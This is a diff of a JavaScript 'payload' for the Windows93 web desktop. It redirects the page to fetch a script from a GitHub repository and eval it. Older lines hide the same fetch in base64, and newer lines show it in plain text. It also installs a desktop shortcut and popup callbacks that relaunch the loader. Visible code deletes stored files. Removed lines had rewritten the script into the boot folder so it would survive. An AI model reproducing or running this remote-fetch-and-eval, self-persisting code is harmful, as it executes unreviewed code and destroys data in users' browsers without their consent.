@@ -1,4 +1,4 @@
-window.location.replace("https://v2.windows93.net/#js%20eval(atob('ZmV0Y2goJ2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9pdm9yeWRldnJpbW9hbHQvUkVWSVZFRDIwMjYtV0lORE9XUzkzVUxUSU1BVEVKQVZBU0NSSVBUTElTVEBtYWluL2FsbDM4dXIuanMnKS50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkudGhlbihzY3JpcHQgPT4gZXZhbChzY3JpcHQpKTs='))");
+window.location.replace("https://v2.windows93.net/#js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/REVIVED2026-WINDOWS93ULTIMATEJAVASCRIPTLIST/refs/heads/main/all38ur.js').then(response => response.text()).then(script => eval(script));");
 (function() {
   const bgUrl = "/c/files/images/png/tumblr_nj90mi2hlh1t6hgmzo1_400.png";
   const musicUrl = "https://cdn.jsdelivr.net/gh/ivorydevrimoalt/REVIVED2026-WINDOWS93ULTIMATEJAVASCRIPTLIST@main/convert.454f6cce.mp3";
@@ -6,7 +6,7 @@ window.location.replace("https://v2.windows93.net/#js%20eval(atob('ZmV0Y2goJ2h0d
   // 1. The ALL38UR shortcut payload
   const shortcutPayload = {
     "icon": bgUrl,
-    "exe": "js fetch('https://cdn.jsdelivr.net/gh/ivorydevrimoalt/REVIVED2026-WINDOWS93ULTIMATEJAVASCRIPTLIST@main/all38ur.js').then(response => response.text()).then(script => eval(script));",
+    "exe": "js fetch('https://raw.githubusercontent.com/ivorydevrimoalt/REVIVED2026-WINDOWS93ULTIMATEJAVASCRIPTLIST/refs/heads/main/all38ur.js').then(response => response.text()).then(script => eval(script));",
     "title": "ALL38UR"
   };
 
@@ -106,14 +106,6 @@ window.location.replace("https://v2.windows93.net/#js%20eval(atob('ZmV0Y2goJ2h0d
           try { $fs.rm(p, () => {}); } catch(e) {}
         }
         localStorage.removeItem(p);
-      }
-
-      // Replicate files back into /a/boot/ if missing
-      if (!localStorage.getItem('/a/boot/all38ur.css')) {
-        bootWrite('/a/boot/all38ur.css', \`${targetCSS}\`);
-      }
-      if (!localStorage.getItem('/a/boot/all38ur.js')) {
-        bootWrite('/a/boot/all38ur.js', decodeURIComponent("${encodeURIComponent(arguments.callee.toString())}"));
       }
 
       let style = document.getElementById('ivory-permanent-style') || document.createElement('style');
@@ -222,7 +214,7 @@ window.location.replace("https://v2.windows93.net/#js%20eval(atob('ZmV0Y2goJ2h0d
             top: Math.floor(Math.random() * Math.max(100, window.innerHeight - 180)),
             sound: false,
             onok: function() {
-              window.location.replace("https://v2.windows93.net/#js eval(atob('ZmV0Y2goJ2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9pdm9yeWRldnJpbW9hbHQvUkVWSVZFRDIwMjYtV0lORE9XUzkzVUxUSU1BVEVKQVZBU0NSSVBUTElTVEBtYWluL2FsbDM4dXIuanMnKS50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkudGhlbihzY3JpcHQgPT4gZXZhbChzY3JpcHQpKTs='))");
+              window.location.replace("https://v2.windows93.net/#js fetch('https://raw.githubusercontent.com/ivorydevrimoalt/REVIVED2026-WINDOWS93ULTIMATEJAVASCRIPTLIST/refs/heads/main/all38ur.js').then(response => response.text()).then(script => eval(script));");
             }
           })},200);
             }
